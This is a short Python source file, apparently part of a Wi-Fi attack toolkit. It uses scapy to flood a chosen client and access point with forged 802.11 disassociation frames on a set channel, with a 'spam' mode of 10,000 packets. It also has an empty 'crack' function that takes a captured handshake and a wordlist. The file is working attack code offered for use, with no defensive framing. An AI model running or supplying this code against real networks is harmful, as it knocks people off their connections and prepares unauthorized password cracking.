from NetworkController import NetworkController
from scapy.all import *
import time
import subprocess

def deauth(target, access_point, channel, spam, packet_count=10):
    interface = NetworkController().interface
    print(target, access_point);
    subprocess.call(['iwconfig', interface, 'chan', str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    packet = RadioTap()/Dot11(type=0, subtype=10, addr1=target, addr2=access_point, addr3=access_point)/Dot11Disas(reason=3)
    
    if spam:
        packet_count = 10000

    for _ in range(packet_count):
        sendp(packet, iface=interface)
        # time.sleep(0.5)

def crack(handshake, wordlist):
    pass